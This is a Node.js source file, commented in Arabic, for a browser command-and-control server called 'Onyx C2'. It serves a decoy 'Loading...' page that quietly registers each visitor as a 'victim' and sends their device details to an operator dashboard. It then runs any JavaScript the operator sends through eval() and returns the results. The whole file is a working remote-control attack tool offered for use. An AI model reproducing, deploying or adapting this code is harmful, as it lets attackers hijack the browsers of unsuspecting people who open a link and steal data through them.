const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

const PORT = process.env.PORT || 3000;

// تخزين الأجهزة المتصلة
let victims = {};

// صفحة لوحة التحكم الخاصة بك
app.get('/dashboard', (req, res) => {
    let html = `
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <title>Onyx Master Control, baby</title>
        <style>
            body { background: #0b0f19; color: #f8fafc; font-family: monospace; padding: 20px; }
            h1 { color: #38bdf8; }
            .victim-card { background: #1e293b; border: 1px solid #334155; padding: 15px; margin-bottom: 15px; border-radius: 8px; }
            input, button { background: #334155; color: white; border: 1px solid #475569; padding: 8px; border-radius: 4px; }
            button { cursor: pointer; background: #0284c7; }
            pre { background: #0f172a; padding: 10px; border-radius: 4px; overflow-x: auto; color: #4ade80; }
        </style>
    </head>
    <body>
        <h1>Onyx C2 - لوحة السيطرة</h1>
        <div id="victims-list"></div>

        <script src="/socket.io/socket.io.js"></script>
        <script>
            const socket = io();
            socket.emit('register-admin');

            socket.on('update-victims', (data) => {
                const list = document.getElementById('victims-list');
                list.innerHTML = '';
                for (let id in data) {
                    let v = data[id];
                    list.innerHTML += \`
                        <div class="victim-card">
                            <strong>معرف الضحية:</strong> \${id}<br>
                            <strong>الجهاز:</strong> \${v.userAgent}<br>
                            <input type="text" id="cmd-\${id}" placeholder="اكتب الأمر (مثال: alert('Hacked') أو fetch...)" style="width: 70%;">
                            <button onclick="sendCmd('\${id}')">تنفيذ على الجوال</button>
                            <pre id="output-\\${id}">في انتظار الرد...</pre>
                        </div>
                    \`;
                }
            });

            function sendCmd(id) {
                const cmd = document.getElementById('cmd-' + id).value;
                socket.emit('admin-command', { targetId: id, command: cmd });
            }

            socket.on('cmd-result', (data) => {
                document.getElementById('output-' + data.id).innerText = data.result;
            });
        </script>
    </body>
    </html>
    `;
    res.send(html);
});

// الصفحة الوهمية التي تفتح عند الضحية
app.get('/', (req, res) => {
    res.send(`
    <!DOCTYPE html>
    <html lang="ar">
    <head>
        <meta charset="UTF-8">
        <title>Loading...</title>
    </head>
    <body>
        <h2>جاري التحميل، يرجى الانتظار...</h2>
        <script src="/socket.io/socket.io.js"></script>
        <script>
            const socket = io();
            
            socket.on('connect', () => {
                // إرسال معلومات جهاز الضحية بمجرد فتح الرابط
                socket.emit('register-victim', {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    screen: window.screen.width + 'x' + window.screen.height
                });
            });

            // استقبال الأوامر وتنفيذها داخل المتصفح وإرجاع النتيجة
            socket.on('exec-command', async (cmd) => {
                try {
                    let res = eval(cmd); // تنفيذ الأمر برمجياً في المتصفح
                    if (res instanceof Promise) res = await res;
                    socket.emit('command-response', { result: String(res) });
                } catch (err) {
                    socket.emit('command-response', { result: "Error: " + err.message });
                }
            });
        </script>
    </body>
    </html>
    `);
});

// إدارة الاتصالات الحية عبر الـ WebSocket
io.on('connection', (socket) => {
    socket.on('register-victim', (info) => {
        victims[socket.id] = { ...info, socket: socket };
        io.emit('update-victims', getVictimsData());
        console.log(`[+] ضحية جديدة مرتبطة: ${socket.id}`);
    });

    socket.on('register-admin', () => {
        socket.join('admins');
        socket.emit('update-victims', getVictimsData());
    });

    socket.on('admin-command', (data) => {
        const target = victims[data.targetId];
        if (target) {
            target.socket.emit('exec-command', data.command);
            target.socket.once('command-response', (res) => {
                io.to('admins').emit('cmd-result', { id: data.targetId, result: res.result });
            });
        }
    });

    socket.on('disconnect', () => {
        if (victims[socket.id]) {
            delete victims[socket.id];
            io.emit('update-victims', getVictimsData());
            console.log(`[-] انقطع اتصال الضحية: ${socket.id}`);
        }
    });
});

function getVictimsData() {
    let clean = {};
    for (let id in victims) {
        clean[id] = { userAgent: victims[id].userAgent, platform: victims[id].platform };
    }
    return clean;
}

server.listen(PORT, () => {
    console.log(`[*] السيرفر شغال على البورت ${PORT} يا ببي...`);
});
